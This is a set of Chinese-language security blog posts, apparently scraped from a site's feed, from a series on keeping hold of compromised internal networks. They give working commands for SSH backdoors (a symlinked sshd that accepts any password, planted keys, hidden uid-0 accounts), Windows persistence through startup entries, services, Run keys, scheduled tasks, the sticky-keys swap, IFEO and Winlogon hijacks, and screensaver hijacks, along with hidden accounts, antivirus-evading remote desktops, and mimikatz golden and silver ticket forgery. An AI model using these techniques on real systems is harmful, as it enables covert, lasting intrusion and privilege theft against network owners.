href="#登录方式-软链接-amp-公私钥-amp-新帐号" class="headerlink" title="登录方式-软链接&amp;公私钥&amp;新帐号"></a>登录方式-软链接&amp;公私钥&amp;新帐号</h2><h3 id="1、SSH软链接"><a href="#1、SSH软链接" class="headerlink" title="1、SSH软链接"></a>1、SSH软链接</h3><p>在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。<br>SSH配置中开启了PAM进行身份验证<br>查看是否使用PAM进行身份验证：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config|grep UsePAM</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667880000596-3b575cb5-2f49-4828-95c7-ff6e6d7b1454.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br><span class="line">ssh root@xx.xx.xx.xx -p 8888 #输入任意密码都可以连接</span><br></pre></td></tr></table></figure><p>该方法重启后失效</p><h3 id="2、公私钥"><a href="#2、公私钥" class="headerlink" title="2、公私钥"></a>2、公私钥</h3><p><a href="https://www.bilibili.com/read/cv17721345/">https://www.bilibili.com/read/cv17721345/</a><br>开启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667881373499-fd7a04de-5eea-4b2d-8d4c-71f7228cccd0.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">攻击机生成密钥</span></span><br><span class="line">ssh-keygen -t rsa #三次回车</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667881685361-8b796eec-28c1-45d9-8119-48875042541b.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id_rsa : 私钥</span><br><span class="line">id_rsa.pub : 公钥</span><br></pre></td></tr></table></figure><p>将公钥里的内容填写到靶机的<code>/root/.ssh/authorized_keys</code>如果没有可以自行创建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.31.253</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667888934245-c8fcfe5e-deaf-4b6b-bb97-6a90201fb869.png" alt="image.png"></p><h3 id="3、后门帐号"><a href="#3、后门帐号" class="headerlink" title="3、后门帐号"></a>3、后门帐号</h3><p>添加root用户：<br>添加账号test1，设置uid为0，密码为123456</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` test1 -o -u 0 -g root -G root -s /bin/bash -d /home/test1</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667883134018-ac8ecc10-ede4-4dfe-8a1b-db7a503c9565.png" alt="image.png"><br>另一种方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test2:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class="line">passwd test2 #修改test2的密码为hack1234</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667883375825-cf841606-77ef-4fb9-841f-5210e1eb62a2.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网权限维持(三)-自启动&amp;映像劫持&amp;屏保后门&amp;WinLogon</title>
      <link href="/posts/963b23dc/"/>
      <url>/posts/963b23dc/</url>
      
        <content type="html"><![CDATA[<h1 id="内网权限维持-三-自启动-amp-映像劫持-amp-屏保后门-amp-WinLogon"><a href="#内网权限维持-三-自启动-amp-映像劫持-amp-屏保后门-amp-WinLogon" class="headerlink" title="内网权限维持(三)-自启动&amp;映像劫持&amp;屏保后门&amp;WinLogon"></a>内网权限维持(三)-自启动&amp;映像劫持&amp;屏保后门&amp;WinLogon</h1><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h3 id="1、自启动路径加载"><a href="#1、自启动路径加载" class="headerlink" title="1、自启动路径加载"></a>1、自启动路径加载</h3><p>将木马放到以下目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</span><br></pre></td></tr></table></figure><p>重启机器即加载启动项运行木马<br><img src="/posts/963b23dc/1667696501226-f77932df-1fd7-4527-aa2a-a2c9ad1743ee.png" alt="image.png"></p><h3 id="2、自启动服务加载"><a href="#2、自启动服务加载" class="headerlink" title="2、自启动服务加载"></a>2、自启动服务加载</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建自启动服务 路径执行木马</span></span><br><span class="line"><span class="built_in">sc</span> create ServiceTest binPath= C:\test.exe <span class="built_in">start</span>= auto</span><br><span class="line"><span class="comment">#删除该服务</span></span><br><span class="line"><span class="built_in">sc</span> delete ServiceTest</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667697583427-7ab0fb58-2bc8-4a9a-9be4-92156a77e1c5.png" alt="image.png"><br><img src="/posts/963b23dc/1667697620851-965eedba-7853-495c-bafe-21cd59c55873.png" alt="image.png"><br>重启电脑，即可上线<br><img src="/posts/963b23dc/1667697753812-99927196-7f6f-4ad5-a6c7-355fb86dbf84.png" alt="image.png"></p><h3 id="3、自启动注册表加载"><a href="#3、自启动注册表加载" class="headerlink" title="3、自启动注册表加载"></a>3、自启动注册表加载</h3><p>当前用户键值注册表路径:<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </code><br>服务器键值注册表路径（需要管理员权限）:<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run </code><br>添加启动项</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /V <span class="string">&quot;backdoor&quot;</span> /t REG_SZ /F /D <span class="string">&quot;C:\test.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667698191236-7c8ee93b-e4e3-4a2d-a6a8-bb2ace5ae2ca.png" alt="image.png"><br><img src="/posts/963b23dc/1667698482156-013beb79-61f8-41fe-8429-0e5b43d5b9ae.png" alt="image.png"><br><img src="/posts/963b23dc/1667698572986-06630cfd-e8ef-4586-ab09-ce6d6d84901b.png" alt="image.png"></p><h3 id="4、计划计时任务"><a href="#4、计划计时任务" class="headerlink" title="4、计划计时任务"></a>4、计划计时任务</h3><p>和横向移动at命令相同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每天01:02，以system权限启动木马</span></span><br><span class="line">schtasks /Create /TN TestService2 /SC DAILY /ST 01:02 /TR c:\test.exe /RL HIGHEST</span><br></pre></td></tr></table></figure><h2 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h2><p>系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。<br>粘滞键位置：<br>c:\windows\system32\sethc.exe<br>move sethc.exe sethc1.exe<br>copy cmd.exe sethc.exe</p><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><blockquote><p>映像劫持是利用Windows的IFEO（Image File Execution Options）功能来实现的。IFEO实际上是Windows的一项正常功能，主要用于调试程序，其初衷是在程序启动的时候开启调试器来调试程序，这样一来可以在调试器中观察程序在难以重现的环境中的行为。例如，某个程序在随用户登录自动启动时会出错，但在登录后手动启动时却一切正常，这就可以通过IFEO设置一个调试器，无论程序何时启动，都会开启这个调试器对其进行调试，以便找出问题。很多病毒木马都会使用这种手段阻止安全软件的运行</p></blockquote><p>测试：执行notepad变为计算器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe /c calc&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667699463838-5553e5e4-16f3-4fb5-a73b-a04ffaebe880.png" alt="image.png"><br><img src="/posts/963b23dc/1667699676425-257e81fd-551a-4293-be33-0b38ec6a3772.png" alt="image.png"><br>配合GlobalFlag隐藏：执行正常关闭后触发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\xd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667699753460-e4396022-bfec-4a4e-8947-e240edbedddc.png" alt="image.png"><br>开启记事本然后关闭即触发运行木马<br><img src="/posts/963b23dc/1667699977401-4bfd3220-77d9-4dce-bee4-29e320683a33.png" alt="image.png"></p><h3 id="1、WinLogon配合无文件落地上线"><a href="#1、WinLogon配合无文件落地上线" class="headerlink" title="1、WinLogon配合无文件落地上线"></a>1、WinLogon配合无文件落地上线</h3><p>注册表<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>中<code>Userinit</code>对应的值是当用户登录时触发的程序可以将该值的后面加上木马路径,当触发登录时也就执行了木马<br><img src="/posts/963b23dc/1667703155205-1348e67a-3857-4c9d-aba3-a556b30fdf74.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\Windows\System32\userinit.exe,C:\test.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667703857264-7b976698-39d3-41a4-9d69-d23c14eda660.png" alt="image.png"><br>接下来注销重新登录触发木马<br><img src="/posts/963b23dc/1667704721751-77e83ce5-8c4a-4b2f-b5b9-8c48d1724b34.png" alt="image.png"><br>还可以利用cs生成powershell payload实现无文件落地上线<br><img src="/posts/963b23dc/1667707347980-1c55ead5-ef5b-4858-98a0-c7f55c62c6bf.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\Windows\System32\userinit.exe,[powershell payload]&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667707878353-2c0978e9-b23b-425f-839c-4f71cfcf1ed9.png" alt="image.png"></p><h2 id="屏保-amp-登录"><a href="#屏保-amp-登录" class="headerlink" title="屏保&amp;登录"></a>屏保&amp;登录</h2><h3 id="2、屏幕保护生效后执行后门"><a href="#2、屏幕保护生效后执行后门" class="headerlink" title="2、屏幕保护生效后执行后门"></a>2、屏幕保护生效后执行后门</h3><p>如果选择了屏幕保护程序那么注册表<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>中SCRNSAVE.EXE的值就是对应的屏幕保护程序，如果把这个值改为我们的木马程序那么当开启屏幕保护时也就触发了木马<br><img src="/posts/963b23dc/1667702046308-49f5a358-765f-4f3c-a9ec-27aa0cf6943e.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\test.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/posts/963b23dc/1667702268999-84396f99-1c6d-48d0-8c63-561353026e51.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据</title>
      <link href="/posts/a5dc2208/"/>
      <url>/posts/a5dc2208/</url>
      
        <content type="html"><![CDATA[<h1 id="内网权限维持-二-隐藏账户-amp-RustDesk-amp-GotoHTTP-amp-黄金白银票据"><a href="#内网权限维持-二-隐藏账户-amp-RustDesk-amp-GotoHTTP-amp-黄金白银票据" class="headerlink" title="内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据"></a>内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据</h1><h2 id="基于用户-隐藏用户"><a href="#基于用户-隐藏用户" class="headerlink" title="基于用户-隐藏用户"></a>基于用户-隐藏用户</h2><p><a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p><h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-u</span> test <span class="literal">-p</span> Test!<span class="selector-tag">@</span><span class="comment">#45</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667524435579-52f23fb8-5d51-431e-9ea5-650a63e45ba1.png" alt="image.png"><br>添加完成后再cmd查看当前用户<br><img src="/posts/a5dc2208/1667524473307-26889a1f-224a-471b-bfc6-68279a9e3a0d.png" alt="image.png"><br>并没有发现新用户<br>但是再控制面板中可以发现创建的用户<br><img src="/posts/a5dc2208/1667524509820-bb5f8573-835d-4315-866b-47759c9f063c.png" alt="image.png"><br>右键删除可以直接删除<br>该工具也可以用来查找当前环境下的隐藏用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-c</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667524737163-5c63092a-db01-43d7-9ddc-7b015f7c559e.png" alt="image.png"></p><h3 id="单机版"><a href="#单机版" class="headerlink" title="单机版"></a>单机版</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-u</span> test <span class="literal">-p</span> Test!<span class="selector-tag">@</span><span class="comment">#45</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667525872698-0415f258-7c02-4867-8e32-8355084e36cf.png" alt="image.png"><br>依旧可以创建成功<br><img src="/posts/a5dc2208/1667525893506-291548a0-084f-4f98-9bdb-ba9b40f2c2b2.png" alt="image.png"><br>命令行也无法查看<br><img src="/posts/a5dc2208/1667525949300-e5669d5b-39c3-4eba-bb30-bae493a924a3.png" alt="image.png"><br>同样在控制面板中也可以看到<br>但是右键删除不能删掉<br><img src="/posts/a5dc2208/1667525994595-d62f66f0-6a7b-4477-a751-20e0292e3222.png" alt="image.png"><br><strong>原因:</strong><br>右键用户属性可以看到该用户不属于任何组<br><img src="/posts/a5dc2208/1667526058767-ee1f4e93-a807-4422-86bc-de71f935a3ca.png" alt="image.png"><br>通过命令手动添加隐藏用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test123<span class="variable">$</span> test123 /add</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667526339122-ec472be0-d302-4193-8816-5def3e52685b.png" alt="image.png"><br>可以看到手工添加的用户是存在组的，右键也可以直接删除<br>**总结:**该隐藏用户控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除</p><h2 id="基于软件-GotoHTTP-amp-RustDesk"><a href="#基于软件-GotoHTTP-amp-RustDesk" class="headerlink" title="基于软件-GotoHTTP&amp;RustDesk"></a>基于软件-GotoHTTP&amp;RustDesk</h2><p><strong>为什么利用这些软件?</strong><br>这些软件利用内网穿透可以绕过协议的封禁,同时这些软件在杀毒软件里为白名单，同时支持静默安装</p><h3 id="GotoHTTP"><a href="#GotoHTTP" class="headerlink" title="GotoHTTP"></a>GotoHTTP</h3><p><a href="https://gotohttp.com/goto/download.12x">https://gotohttp.com/goto/download.12x</a><br><strong>利用场景</strong>：有网络下，需要绕过杀毒等网络防护<br>B2C模式，无需安装控制端软件，有浏览器就可以远控。<br>流量走https协议，只要目标放行443端口出口就可以实现内网穿透。<br>在低带宽也可以使用，运行占用内存极低，控制时占用CPU仅为0%-3%。<br>被控端在类Linux系统上支持图形界面（GUI）和字符界面（CLI）<br>网络唤醒远程主机需加载驱动，导致运行时安全卫士会拦截这行为，其他杀软不会拦截。<br>启动软件后会自动生成id和控制码<br><img src="/posts/a5dc2208/1667528215045-7b6f6ae6-f9cb-4e2f-beed-f2cced707e53.png" alt="image.png"><br>实战中没有图形化如何获得id和控制码呢？<br>id生成后会在当前文件夹生成两个文件<br><img src="/posts/a5dc2208/1667528316523-a7709c2d-42ff-4e39-bf63-2fa34c64e37b.png" alt="image.png"><br>其中<code>gotohttp.ini</code>就是存储的id值和密码通过命令行读取即可<br><img src="/posts/a5dc2208/1667528381379-949e769a-a480-4c2f-b6cc-6c8c3f5fccbb.png" alt="image.png"><br>得到id值到:<a href="http://gotohttp.com/">http://gotohttp.com/</a> 登录即可<br><img src="/posts/a5dc2208/1667528470494-a4e8cff4-462b-4085-85cc-8370604062aa.png" alt="image.png"></p><h3 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h3><p><a href="https://github.com/rustdesk/rustdesk">https://github.com/rustdesk/rustdesk</a><br>利用场景：无需网络，需要绕过杀毒等网络防护</p><h4 id="1、有网连接"><a href="#1、有网连接" class="headerlink" title="1、有网连接"></a>1、有网连接</h4><p>直接运行软件<br>配置文件位置<code>C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</code><br><img src="/posts/a5dc2208/1667530174725-59e35cf1-c8ac-4550-b12c-caf0babbca87.png" alt="image.png"><br>直接连接即可<br><img src="/posts/a5dc2208/1667531219983-4e54517e-8600-45a0-a1fb-427e1f5bf13a.png" alt="image.png"></p><h4 id="2、无网内网连接"><a href="#2、无网内网连接" class="headerlink" title="2、无网内网连接"></a>2、无网内网连接</h4><p>修改<code>RustDesk2.toml</code>文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">direct<span class="literal">-server</span> = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">direct<span class="literal">-access-port</span> = <span class="string">&#x27;8443&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667531451765-d2820289-ef6c-4209-b6e1-c5e97cd18d17.png" alt="image.png"><br>然后利用同网段主机进行连接<br><img src="/posts/a5dc2208/1667531789477-cbc2907d-6353-4644-acc3-c3c146eb5906.png" alt="image.png"><br>密码依旧是在<code>RustDesk.toml</code>下<br><img src="/posts/a5dc2208/1667531831333-28d504b6-2997-4b5a-a2a5-5f21b396ebb3.png" alt="image.png"></p><h2 id="基于服务TGT-黄金白银票据"><a href="#基于服务TGT-黄金白银票据" class="headerlink" title="基于服务TGT-黄金白银票据"></a>基于服务TGT-黄金白银票据</h2><p><a href="https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</a></p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>⻩⾦票据⽣成攻击，是⽣成有效的TGT Kerberos票据，并且不受TGT⽣命周期的影响（TGT默认10⼩时，最多续订7天），这⾥可以为任意⽤户⽣成⻩⾦票据，然后为域管理员⽣成TGT，这样普通⽤户就可以变成域管理员。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、已经拿下域管理员，获取到krbtgt hash；<br>2、利用krbtgt的hash制作黄金票据工具，进行攻击。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1、获取域名<br><img src="/posts/a5dc2208/1667532830396-7f856bbe-f343-4767-b565-87d7ebb95bf3.png" alt="image.png"><br>2、获取域的SID值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667532924559-ba0c1151-1b87-4dd0-9a5f-5cf6a57aab53.png" alt="image.png"><br>不需要后四位<br>3、获取域的KRBTGT账户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mimikatz 需要用域管账户获取</span></span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667535955270-a9312f61-e94f-4460-b183-732f3dfbb9c2.png" alt="image.png"><br>4、伪造用户名：webadmin（任意用户名）<br>生成票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mimkatz</span></span><br><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S<span class="literal">-1-5-21-1218902331-2157346161-1782232778</span> /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667536010200-fad90b02-95c9-4e65-92d1-796f188908b5.png" alt="image.png"><br>导入内存</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt g</span><br></pre></td></tr></table></figure><p>访问测试：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\owa2010cn<span class="literal">-god</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667536098971-7e2ca117-5821-4ec0-99b1-9f084d49f865.png" alt="image.png"><br>黄金票据总结：<br>该攻击⽅式其实是⼀种后⻔的形式，属于第⼆次进⾏攻击的⽅法。<br>第⼀次拿到域管权限之后，需要将krbtgt NTLM hash进⾏保存，当第⼆次再来进⾏域渗透攻击时，我们就可使⽤krbtgt的NTLM hash制作⻩⾦票据，从⽽再次获得域管权限。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据（SILVER TICKET）是利用域的服务账户进行伪造的ST，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key 解密ST，从而获得 Session Key。所以只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用（不需要交互KDC，需要知道Server的NTLM Hash）。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、已经拿下域管理员，获取到DC hash；<br>2、利用DC的hash制作白银票据工具，进行攻击。</p><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><p>1、获取域名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667536605598-8d639962-0737-43ba-9301-e8545fcc0e8e.png" alt="image.png"><br>2、获取域的SID值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>3、获取目标主机账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>4、伪造用户名：webadmin（任意用户名）<br>导入票据：（CIFS文件共享服务）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">domain：域名</span><br><span class="line">sid：域环境下的SID，除去最后-的部分剩下的内容</span><br><span class="line">target：要访问的服务器，写FQDN</span><br><span class="line">rc4：写的是目标主机的NTLM（主机名<span class="variable">$</span>对应NTLM）</span><br><span class="line">service：要访问的资源类型</span><br><span class="line">user：伪造的用户</span><br><span class="line">cifs：共享文件</span><br><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S<span class="literal">-1-5-21-1218902331-2157346161-1782232778</span> /target:owa2010cn<span class="literal">-god</span>.god.org /service:cifs /rc4:d7ff309bdcb4ea181a2b00540e1cd173 /ptt</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667538062205-0cd8b355-5f35-4d2e-819a-4a12f7d1f65b.png" alt="image.png"><br>查看当前票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667538141770-3b003d66-70a5-4476-8456-72e62fb8b136.png" alt="image.png"><br>通讯测试</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\owa2010cn<span class="literal">-god</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure><p><img src="/posts/a5dc2208/1667538108035-b81f127f-6c5b-47bc-8b6a-9750058518c7.png" alt="image.png"><br>白银票据总结<br>1、伪造的ST，只能访问指定的服务，如CIFS；<br>2、不与KDC交互，直接访问Server；<br>3、ST由服务账号 NTLM Hash 加密。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey</title>
      <link href="/posts/b140a792/"/>
      <url>/posts/b140a792/</url>
      
